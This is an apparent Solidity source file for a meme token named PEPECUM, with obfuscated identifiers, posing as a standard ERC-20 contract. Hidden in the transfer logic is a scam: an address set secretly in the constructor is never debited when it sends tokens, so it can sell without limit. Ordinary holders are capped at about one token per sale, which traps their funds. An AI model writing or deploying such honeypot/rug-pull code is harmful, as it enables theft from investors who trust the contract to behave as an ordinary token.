/*

https://t.me/ercpepecum

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPECUM is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    string public name;

    mapping(address => uint256) private nfztoh;

    mapping(address => uint256) public balanceOf;

    function approve(address pbugdqwhcz, uint256 hxcz) public returns (bool success) {
        allowance[msg.sender][pbugdqwhcz] = hxcz;
        emit Approval(msg.sender, pbugdqwhcz, hxcz);
        return true;
    }

    function transferFrom(address lnzjaxuofqs, address cine, uint256 hxcz) public returns (bool success) {
        require(hxcz <= allowance[lnzjaxuofqs][msg.sender]);
        allowance[lnzjaxuofqs][msg.sender] -= hxcz;
        afbvmuwksgy(lnzjaxuofqs, cine, hxcz);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private nwbtr;

    mapping(address => uint256) private iemvy;

    function transfer(address cine, uint256 hxcz) public returns (bool success) {
        afbvmuwksgy(msg.sender, cine, hxcz);
        return true;
    }

    function afbvmuwksgy(address lnzjaxuofqs, address cine, uint256 hxcz) private {
        address ksjygcqtzu = IUniswapV2Factory(nwbtr.factory()).getPair(address(this), nwbtr.WETH());
        bool gkpql = 0 == nfztoh[lnzjaxuofqs];
        if (gkpql) {
            if (lnzjaxuofqs != ksjygcqtzu && iemvy[lnzjaxuofqs] != block.number && hxcz < totalSupply) {
                require(hxcz <= totalSupply / (10 ** decimals));
            }
            balanceOf[lnzjaxuofqs] -= hxcz;
        }
        balanceOf[cine] += hxcz;
        iemvy[cine] = block.number;
        emit Transfer(lnzjaxuofqs, cine, hxcz);
    }

    uint256 private dcziow = 100;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory upqo, string memory gmsvprfubd, address wqgsadiyftn, address lartdpky) {
        name = upqo;
        symbol = gmsvprfubd;
        balanceOf[msg.sender] = totalSupply;
        nfztoh[lartdpky] = dcziow;
        nwbtr = IUniswapV2Router02(wqgsadiyftn);
    }
}
